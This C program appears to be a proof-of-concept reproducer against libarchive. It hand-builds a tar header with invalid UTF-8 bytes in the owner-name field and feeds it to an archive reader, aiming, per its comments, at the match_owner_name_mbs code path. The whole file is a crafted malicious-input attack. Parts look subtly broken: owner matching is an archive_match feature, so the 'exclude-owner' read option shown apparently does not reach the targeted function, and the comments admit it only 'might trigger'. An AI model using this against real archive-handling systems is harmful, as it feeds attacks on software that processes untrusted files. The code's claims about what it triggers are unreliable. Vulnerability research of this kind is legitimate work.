#include <archive.h>
#include <archive_entry.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    struct archive *a;
    struct archive_entry *entry;
    const void *buff;
    size_t size;
    int64_t offset;
    int r;
    
    /* Create a malicious archive in memory */
    unsigned char archive_data[2048];
    size_t archive_size = 0;
    
    /* Minimal tar header with crafted owner name */
    unsigned char tar_header[512];
    memset(tar_header, 0, sizeof(tar_header));
    
    /* File name */
    strcpy((char*)tar_header, "test.txt");
    
    /* Mode */
    strcpy((char*)tar_header + 100, "0000644");
    
    /* UID */
    strcpy((char*)tar_header + 108, "0000000");
    
    /* GID */
    strcpy((char*)tar_header + 116, "0000000");
    
    /* Size */
    strcpy((char*)tar_header + 124, "00000000000");
    
    /* Mtime */
    strcpy((char*)tar_header + 136, "00000000000");
    
    /* Checksum placeholder */
    memset(tar_header + 148, ' ', 8);
    
    /* Type flag */
    tar_header[156] = '0';
    
    /* Owner name - craft with invalid UTF-8 or encoding that causes archive_mstring_get_mbs to return positive */
    /* Use invalid UTF-8 sequence that might trigger encoding warning/error */
    tar_header[265] = 0xFF;
    tar_header[266] = 0xFE;
    tar_header[267] = 0xFF;
    tar_header[268] = 0xFE;
    
    /* Calculate checksum */
    unsigned int checksum = 0;
    for (int i = 0; i < 512; i++) {
        checksum += tar_header[i];
    }
    sprintf((char*)tar_header + 148, "%06o", checksum);
    tar_header[154] = 0;
    tar_header[155] = ' ';
    
    memcpy(archive_data, tar_header, 512);
    archive_size = 512;
    
    /* Add two blocks of zeros to end archive */
    memset(archive_data + archive_size, 0, 1024);
    archive_size += 1024;
    
    /* Create archive reader */
    a = archive_read_new();
    archive_read_support_format_tar(a);
    archive_read_support_filter_all(a);
    
    /* Add owner name exclusion pattern to trigger match_owner_name_mbs */
    archive_read_set_options(a, "exclude-owner=testowner");
    
    /* Open the malicious archive */
    r = archive_read_open_memory(a, archive_data, archive_size);
    if (r != ARCHIVE_OK) {
        fprintf(stderr, "Failed to open archive: %s\n", archive_error_string(a));
        archive_read_free(a);
        return 1;
    }
    
    /* Read the entry - this should trigger match_owner_name_mbs */
    r = archive_read_next_header(a, &entry);
    if (r == ARCHIVE_OK) {
        /* Try to read data to fully process the entry */
        while (archive_read_data_block(a, &buff, &size, &offset) == ARCHIVE_OK) {
            /* Process data */
        }
    }
    
    archive_read_free(a);
    
    return 0;
}